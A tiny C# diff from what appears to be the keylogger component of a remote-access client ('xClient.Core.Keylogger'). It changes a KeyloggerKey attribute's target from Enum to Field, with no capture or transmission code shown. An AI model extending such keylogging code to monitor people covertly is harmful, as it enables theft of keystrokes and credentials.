@@ -4,7 +4,7 @@ using System.Text;
 
 namespace xClient.Core.Keylogger
 {
-    [AttributeUsage(AttributeTargets.Enum, AllowMultiple = false)]
+    [AttributeUsage(AttributeTargets.Field, AllowMultiple = false)]
     public class KeyloggerKey : Attribute
     {
         /// <summary>
